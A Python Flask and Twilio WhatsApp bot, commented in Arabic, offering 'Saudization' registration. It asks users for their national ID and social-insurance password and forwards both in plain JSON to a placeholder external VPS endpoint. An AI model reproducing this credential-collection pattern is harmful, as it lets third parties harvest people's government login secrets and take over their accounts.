from flask import Flask, request
from twilio.twiml.messaging_response import MessagingResponse
import requests
import os

app = Flask(__name__)

# صفحة رئيسية لاختبار الاتصال
@app.route("/", methods=["GET"])
def home():
    return "بوت السعودة يعمل ✅"

# نقطة استقبال رسائل واتساب من Twilio
@app.route("/bot", methods=["POST"])
def bot():
    incoming_msg = request.values.get("Body", "").strip().lower()
    sender = request.values.get("From", "")

    resp = MessagingResponse()
    msg = resp.message()

    if "سعوده" in incoming_msg:
        msg.body(
            "👋 مرحباً بك في بوت السعودة.\n\nالرجاء إرسال رقم الهوية وكلمة المرور للتسجيل في التأمينات.\nمثال:\n1234567890, كلمة_المرور"
        )

    elif "," in incoming_msg:
        try:
            national_id, password = [i.strip() for i in incoming_msg.split(",")]

            # هنا يمكنك ربط السكربت الحقيقي لموقع التأمينات (سيرفر خارجي)
            # مثلاً إرسال البيانات إلى سكربت على سيرفر VPS
            requests.post("https://your-vps-domain.com/saudabot-login", json={
                "id": national_id,
                "password": password,
                "sender": sender
            })

            msg.body("✅ تم استلام البيانات، سيتم تنفيذ التسجيل وإبلاغك بالتفاصيل قريباً.")

        except Exception as e:
            msg.body(f"❌ حدث خطأ أثناء معالجة البيانات: {str(e)}")

    else:
        msg.body("❗ أرسل كلمة \"سعوده\" لبدء العملية.")

    return str(resp)


if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=5000)

